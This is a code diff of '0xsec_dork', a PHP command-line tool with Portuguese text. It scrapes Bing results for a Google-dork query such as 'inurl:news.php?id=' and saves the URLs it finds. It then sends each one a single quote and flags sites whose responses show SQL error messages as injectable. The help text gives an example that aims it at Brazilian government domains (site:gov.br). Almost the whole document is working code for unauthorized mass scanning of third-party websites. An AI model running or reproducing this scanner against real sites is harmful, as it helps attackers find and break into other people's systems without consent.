@@ -7,13 +7,18 @@
 	# Data: 25/12/16
 	# Versao: 1.0
 	# Testado em: [Kali linux 2.0 | Windows 7]
+	
 
 	error_reporting(0);
 	set_time_limit(0);
-	$dork = $argv[2] . " ". $argv[3];
+
+$d = $argv[2];
+if($argv[3] != "-sql"){
 	
-	function banner(){
-			echo "
+	$d = $d ." ". $argv[3];
+}
+function banner(){
+	echo "
 
    ___          _____                      _ _         
   / _ \        / ____|                    (_) |        
@@ -23,111 +28,150 @@
   \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                   __/ | 0.1
                                                  |___/ 
- [+] 0xsec_dork sql
- [+] Plataforma: php
- [+] Criado: Pablo Santhus
- [+] Dork: {$dork}
- [+] Facebook: https://www.facebook.com/pablosanthus
- [+] Ajuda: php 0xsec_dork.php -h\n
+	[+] Autor: Pablo Santhus
+	[+] Data: 01/01/2017
+	[+] Nome: 0xsec_dork
+	[+] Ajuda: 0xsec_dork.php -h
+	[+] Dork: {$d}
 
-";}
-	
+";
+
+
+}
+
 	banner();
+	$dork = urlencode($d);
+	$urls = "https://www.bing.com/search?q=";
+	$url = $urls . $dork;
+	$pag = array("&first=1","&first=2","&first=3","&first=4","&first=5","&first=6","&first=7","&first=8","&first=9","&first=10");
 
-		$config['proxy'] = $argv[$a];
-		$config['host'] = "https://www.bing.com/search?q=";
-		$config['dork'] = urlencode($dork);
-		$config['url'] = $config['host'] . $config['dork'];
+if($argv[1] == "-dork" or $argv[1] == "-d" && isset($argv[3])){
 
+	foreach($pag as $paginacao){
+		$web = $url . $paginacao;
+		$f = @fopen($web, "r");
 
-if($argv[1] == "-dork" or $argv[1] == "-d" && isset($argv[2]) ){
- 
-	if (isset($config['url'])) {
+		while($buf = fgets($f, 1024)){
+			$buf = fgets($f, 4096);
+			preg_match_all("#\b((((ht|f)tps?://)|(ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i", $buf, $match);
 
-	$f = @fopen($config['url'],"r");
-	$count = 1;
-		while($buf = fgets($f,1024)){
+			for($i=0; $match[$i]; $i++){
 
-		$buf = fgets($f, 4096);
-		preg_match_all("#\b((((ht|f)tps?://)|(ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i",$buf,$words);
-			for( $i = 0; $words[$i]; $i++ ){
-				for( $j = 0; $words[$i][$j]; $j++ ){
+				for($f = 0; $match[$i][$f]; $f++){
 
-						if (isset($words[$i][$j]) && !strstr($words[$i][$j], "google") && !strstr($words[$i][$j], "youtube") && !strstr($words[$i][$j], "orkut") && !strstr($words[$i][$j], "microsoft") && !strstr($words[$i][$j], "blogger") && !strstr($words[$i][$j], "live") && !strstr($words[$i][$j], "facebook") && !strstr($words[$i][$j], "bing")) {
+					if(isset($match[$i][$f]) && !strstr($match[$i][$f], "google") && !strstr($match[$i][$f], "microsoft") && !strstr($match[$i][$f], "youtube") && !strstr($match[$i][$f], "bing") && !strstr($match[$i][$f], "blogger") && !strstr($match[$i][$f], "yahoo") && !strstr($match[$i][$f], "facebook")){
 
-							$urls = strtolower($words[$i][$j]);
-							$urls = str_replace(array("http://", "https://", "ht", "cid-"), "", $words[$i][$j]);
-
-						    if(!$urls == ""){
-						    	print "[".$count."] " . "$urls\n";
-						    	if($argv[4] == "--sql" or $argv[4] == "-sql"){
-									$fp = fopen("urls.txt", "a");
-									fwrite($fp, " ". $urls . "\n");
-						    	}
-						    }
-					    	$count++;
+						$sites = strtolower($match[$i][$f]);
+						$sites = str_replace(array("http://","https://","ht"), "", $match[$i][$f]);
+						
+						if(!$sites == ""){
+							print "[*] " . $sites . "\n";
+							$fp = fopen("url.txt", "a");
+							fwrite($fp, " " . $sites . "\n");
+							$num = count(file("url.txt"));
+						}
+						
 					}
 				}
 			}
 		}
 	}
+print "\n";
+print "___________________________________________________________________\n\n";
 
+echo "[+] Numero de sites encontrado {$num} \n";
 
-	if($argv[4] == "--sql" or $argv[4] == "-sql"){
-		print "\n\n";
-		echo " ---------------------------------------------------------------------------------\n\n";
-		echo " [+] Iniciando Verificacao Sql Injection \n";sleep(1);
-		echo " [+] Capturando Hosts\n";sleep(1);
-		echo " [+] Hosts Capturados\n";sleep(1);
-		echo " [+] Iniciando ...\n";sleep(1);
-		echo " ---------------------------------------------------------------------------------\n\n";
+print "____________________________________________________________________\n\n";
 
-		$file = file("urls.txt");
+	if($argv[3] == "-sql"){
+		print "[+] Verificando \n";sleep(2);
+		print "[+] Verificacao 100%\n";
+		print "[+] Capturando Hosts\n";sleep(2);
+		print "[+] Hosts Capturados\n";
+		print "[+] Iniciando... \n\n";
 
-		$sites = str_replace(" ", "\n", $file);
-
-
-
-		foreach($sites as $site){
+		$file = file("url.txt");
+		$site = str_replace(" ", "\n", $file);
+		foreach($site as $site){
 			$site = str_replace("\n", "", $site);
 			$site = str_replace("\r", "", $site);
 
-			$caminho = "http://" .$site . "'";
-			$error = file_get_contents($caminho);
+			$caminho = "http://" . $site . "'";
+			$verf = file_get_contents($caminho);
 
-			if(eregi("Warning", $error) or eregi("error", $error) or eregi("SQL syntax", $error) or eregi("MySQL", $error)){
-				print "_______________________________________________________________________________\n\n";
-				echo "[+] ". $site . " -->" . " Vulneravel :D \n";
-				print "_______________________________________________________________________________\n\n";
+			if( strstr($verf, "error") or strstr($verf, "mysql") or strstr($verf, "syntax") or strstr($verf, "Warning") or strstr($verf, "SQL syntax")){
+					print"\n";
+					print "_____________________________________________________________________\n\n";
+					print "[+] Site Vuln: " . $site . "\n\n";
+					print "_____________________________________________________________________\n\n";
 			}else{
-				echo "[-] ". $site ." -->" . " NOT Vulneravel :( \n";				
+				print "[-] Site NOT Vuln: " . $site . "\n";
 			}
 		}
-			$fp = fopen("urls.txt", "w");
-			fwrite($fp, "");
-			fclose($fp);
+
+		$u = fopen("url.txt", "w");
+		fwrite($u, "");
+
 	}
 
-}else{
-	echo "\n\n Ajuda: 0xsec_dork.php -h \n\n";
+	if($argv[4] == "-sql"){
+		print "[+] Verificando \n";sleep(2);
+		print "[+] Verificacao 100%\n";
+		print "[+] Capturando Hosts\n";sleep(2);
+		print "[+] Hosts Capturados\n";
+		print "[+] Iniciando... \n\n";
+
+		$file = file("url.txt");
+		$site = str_replace(" ", "\n", $file);
+		foreach($site as $site){
+			$site = str_replace("\n", "", $site);
+			$site = str_replace("\r", "", $site);
+
+			$caminho = "http://" . $site . "'";
+			$verf = file_get_contents($caminho);
+
+			if( strstr($verf, "error") or strstr($verf, "mysql") or strstr($verf, "syntax") or strstr($verf, "Warning") or strstr($verf, "SQL syntax")){
+					print"\n";
+					print "_____________________________________________________________________\n\n";
+					print "[+] Site Vuln: " . $site . "\n\n";
+					print "_____________________________________________________________________\n\n";
+			}else{
+				print "[-] Site NOT Vuln: " . $site . "\n";
+			}
+		}
+
+		$u = fopen("url.txt", "w");
+		fwrite($u, "");
+	}
+
+
 }
 
 if($argv[1] == "-h" or $argv[1] == "-help"){
+	print("\n\n");
+	print "  ######################################################\n";
+    print "  #                                                    #\n";
+	print "  #   0x0x0x0x0x0x Painel de Ajuda 0x0x0x0x0x0x0x0     #\n";
+    print "  #                                                    #\n";
+	print "  ######################################################\n\n";
+
 	echo "
-	options[-d, -sql, -h]  
+			OPTIONS[-dork, -sql, -h]
 
-	*----------------------------------------------------*
-	# -d    |  Atribui uma dork                          #
-	# -sql  |  Verifica Vulnerabilidade em sql injection #
-	# -h    |  Exibe menu de Ajuda                       #
-	*----------------------------------------------------*
+	-dork       Adiciona uma dork para pesquisa ex:(inurl:news.php?id=)
 
-	exemplos:
+	 -sql       Verifica Vulnerabilidade SQL Injection
 
-	0xsec_dork.php -d inurl:news.php?id= 
-	0xsec_dork.php -d inurl:news.php?id= -sql
+	   -h       Exibe painel de ajuda
 
-	";
+	   exemplos:
+
+	   0xsec_dork.php -dork inurl:news.php?id=
+	   0xsec_dork.php -dork inurl:news.php?id= -sql
+	   0xsec_dork.php -dork inurl:news.php?id= site:gov.br -sql
+
+\n";
 }
+
 
 ?>
